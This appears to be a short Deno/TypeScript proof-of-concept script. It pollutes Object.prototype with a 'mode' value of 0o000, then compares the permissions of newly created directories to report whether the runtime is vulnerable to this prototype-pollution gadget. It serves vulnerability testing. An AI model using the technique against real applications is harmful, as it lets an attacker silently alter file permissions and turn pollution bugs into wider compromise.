function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

let unpolluted: number | null = null;
{
    const name = "foo";
    Deno.mkdirSync(`./${name}`, {});
    const fileInfo = await Deno.stat(`./${name}`);
    unpolluted = fileInfo.mode;
    Deno.removeSync(`./${name}`);
}

let polluted: number | null = null;
{
    pollute("mode", 0o000);
    const name = "bar";
    Deno.mkdirSync(`./${name}`, {});
    const fileInfo = await Deno.stat(`./${name}`);
    polluted = fileInfo.mode;
    Deno.removeSync(`./${name}`);
}

if (unpolluted !== polluted) {
    console.log("Your Deno version is vulnerable to this gadget.");
} else {
    console.log("Your Deno version is NOT affected.");
}
